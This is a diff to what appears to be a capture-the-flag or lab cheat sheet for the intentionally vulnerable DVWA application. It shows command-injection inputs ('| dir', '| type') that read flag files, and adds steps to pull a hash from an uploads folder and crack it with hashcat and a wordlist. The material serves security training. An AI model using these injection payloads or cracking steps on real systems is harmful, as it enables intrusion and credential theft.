@@ -20,6 +20,12 @@ login to the dvwa application > set security level low > choose command executio
 | dir "C:\Wamp64\www\DVWA\ECweb\Certified"
 | type "C:\Wamp64\www\DVWA\ECweb\Certified\Flag1.txt"
 | type "C:\Wamp64\www\DVWA\ECweb\Certified\Flag2.txt"
+or
+1. Open the url given and login with given details. 
+2. After login http://172.20.0.16/DWVA/hackable/uploads/ 
+3. They you see files open it and copy the hash value go to the hashes.com/en/decrypt/hash. Or try below. 
+4. hash-identifier paste the text and see the type of hash and then hashcat -h | grep MD5 
+5. hashcat -m 0 hash.txt /Desktop/word list/urser.txt 
 ```
 #### Firewall
 ```bash
